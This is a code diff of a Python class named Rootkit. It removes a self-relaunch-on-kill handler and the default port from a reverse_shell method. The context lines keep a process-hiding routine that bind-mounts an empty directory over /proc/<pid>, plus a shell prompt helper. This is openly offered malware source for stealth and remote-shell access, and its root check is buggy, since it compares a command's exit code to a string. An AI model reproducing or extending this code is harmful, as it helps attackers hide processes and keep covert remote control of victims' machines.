@@ -14,11 +14,6 @@ from time import sleep
 
 class Rootkit:
 
-	def relaunch(self, signal, frame):
-		cmd = sys.argv
-		proc = subprocess.Popen(' '.join(cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-		print "[+] Restarting..."
-
 	def hide_process(self):
 		ch = string.uppercase + string.digits
 		# Bind mount - works with root on linux
@@ -29,22 +24,12 @@ class Rootkit:
 			if os.system("sudo whoami") == 'root':
 				os.system("sudo mkdir /tmp/{1} && sudo mount -o bind /tmp/{1} /proc/{0}".format(pid,token))
 
-		#Relaunch on kill
-		signal.signal(signal.SIGTERM, self.relaunch)
-
 	#Interuot command line to display empty for all commands
 	def shell_text_interupt(self, sock, data):
 		return sock.send("[{0}]> ".format(data))
 
 
-	# Default connection port is 44134
-	def reverse_shell(self, host=None, port=None):
-
-		if host is None:
-			return 0
-
-		if port is None:
-			port = int(44134)
+	def reverse_shell(self, host, port):
 
 		sleep(5)
 
